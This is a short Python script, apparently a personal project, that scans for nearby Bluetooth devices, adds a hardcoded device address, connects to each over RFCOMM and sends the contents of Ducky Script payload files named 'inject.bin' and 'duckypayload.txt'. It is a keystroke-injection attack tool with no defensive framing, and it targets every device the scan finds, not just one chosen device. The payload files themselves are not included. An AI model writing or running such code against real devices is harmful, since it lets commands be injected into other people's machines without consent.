import bluetooth
import pyautogui
import time
print("We out")


def inject():
    dev_list = bluetooth.discover_devices(duration=5, lookup_names=True)
    print(dev_list)
    # Connect to the Bluetooth device
    fifteen11 = "D0:88:0C:C2:A0:C7"
    dev_list[0] = (fifteen11, "1511")
    # Create a Bluetooth socket

    for addy, name in dev_list:
        socket = bluetooth.BluetoothSocket(bluetooth.Protocols.RFCOMM)
        socket.connect((addy, 1))
        # Define the path to the Ducky Script (bin) file
        ducky_script_file = '6. Real anti text\inject.bin' 
        ducky_script_file2 = '6. Real anti text\duckypayload.txt'
        # Replace with the path to your Ducky Script file

        # Read the contents of the Ducky Script file
        with open(ducky_script_file, 'rb') as file:
            ducky_script = file.read()
            socket.sendall(ducky_script)
        with open(ducky_script_file2, 'r') as file:
            ducky_script2 = file.read()
            socket.sendall(ducky_script2)


        # Wait for the commands to be executed
        time.sleep(5)  # Adjust the delay if needed

        # Close the Bluetooth connection
        socket.close()
        pyautogui.press('enter')


    # socket = bluetooth.BluetoothSocket()
    # socket.connect((fifteen11, 1))



if __name__ == "__main__":
    inject()